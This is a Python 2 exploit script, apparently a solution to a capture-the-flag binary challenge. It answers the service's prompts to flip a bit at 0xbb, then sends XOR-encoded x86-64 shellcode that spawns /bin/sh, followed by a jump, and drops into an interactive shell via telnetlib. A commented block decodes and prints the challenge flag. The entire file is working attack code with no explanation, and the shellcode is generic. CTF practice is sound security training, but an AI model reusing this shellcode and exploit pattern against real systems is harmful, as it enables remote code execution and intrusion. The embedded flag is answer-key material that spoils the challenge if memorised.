import socket, struct, telnetlib
import sys
import subprocess


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def enc(data):
    encoded = data[len(data)-1]
    for i in xrange(len(data)-2, -1, -1):
        encoded = chr(ord(encoded[0]) ^ ord(data[i])) + encoded
    return encoded


def dec(data):
    decoded = ''
    for i in xrange(len(data)-1):
        decoded += chr(ord(data[i]) ^ ord(data[i+1]))
    decoded += data[len(data)-1]
    return decoded

s, f = sock("127.0.0.1", 4088)
#s, f = sock("arcade.fluxfingers.net", 1807)

print read_until(f, '):')
f.write('0xbb\n')
read_until(f, '):')
f.write('3\n')



# Flip 0xbb byte 3rd bit
# this should make it jump to 0x4000fe
# 23 bytes
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
# 5 bytes
jmp = '\xeb\xd4'
#jmp = '\xe9\xd2\x00\x40\x00'
send_data = shellcode + ('A' * (39 - len(shellcode))) + jmp
send_data += '\x90' * (46-len(send_data))
send_data = enc(send_data)
#send_data = shellcode + ('A' * (46 - (len(shellcode) + len(jmp)))) + jmp

#print dec(enc('hoge'))
#sys.stdout.write(enc(send_data))
#sys.exit(0)


print 'wait'
print read_until(f, ':')
raw_input()
f.write(enc(send_data) + '\n')
shell(s)

#sys.exit(0)


#print ''
for ch in send_data:
    print hex(ord(ch)),


'''
hoge = '\x0a\x0d\x06\x1c\x22\x38\x18\x26\x36\x0f\x39\x2b\x1c\x59\x42\x2c\x36\x1a\x2c\x26\x1c\x17\x2d\x39\x57\x43\x01\x07\x2b\x38\x09\x07\x1a\x01\x17\x13\x13\x17\x2d\x39\x0a\x0d\x06\x46\x5c\x7d'


print len(hoge)
dec = hoge[len(hoge)-1]
for i in xrange(len(hoge)-2, -1, -1):
    dec = chr((ord(dec[0]) ^ ord(hoge[i]))) + dec
print dec


'flag{Yay_if_th1s_is_yer_f1rst_gnisrever_flag!}'
'''
